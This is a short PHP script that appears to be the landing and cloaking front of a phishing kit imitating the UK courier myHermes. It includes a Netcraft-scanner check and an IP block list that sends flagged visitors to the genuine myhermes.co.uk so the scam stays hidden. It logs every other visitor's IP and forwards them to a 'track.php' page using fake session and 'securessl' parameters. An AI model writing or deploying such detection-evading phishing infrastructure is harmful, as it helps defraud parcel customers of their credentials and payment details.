<?php

session_start();

$ip = $_SERVER['REMOTE_ADDR'];

$hash = md5($ip);
$sessionID = strrev($hash);
$_SESSION['auth'] = true;


include 'files/zero.php';
include 'includes/1.php';
include 'includes/2.php';
include 'includes/netcraft_check.php';

$filename = 'includes/ipbanned.txt';
$ip_to_search = $_SERVER[REMOTE_ADDR];

if (false !== strpos(file_get_contents($filename), $ip_to_search)){

     header("Location: https://www.myhermes.co.uk/");
     $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
     file_put_contents('includes/one_time_br_prevents.log', $line . PHP_EOL, FILE_APPEND);
     session_destroy();
     die();
   }
   else {
     // otherwise
}

//LOGS VISITORS
$file = fopen('backLog/visitors.txt', 'a');
fwrite($file, $_SERVER['REMOTE_ADDR'] . " DATE " . date("d M Y h:i:s") . "\n");
fclose($file);

header("Location: track.php?&URI=$sessionID&sessionid=$hash&securessl=true");
die();

?>
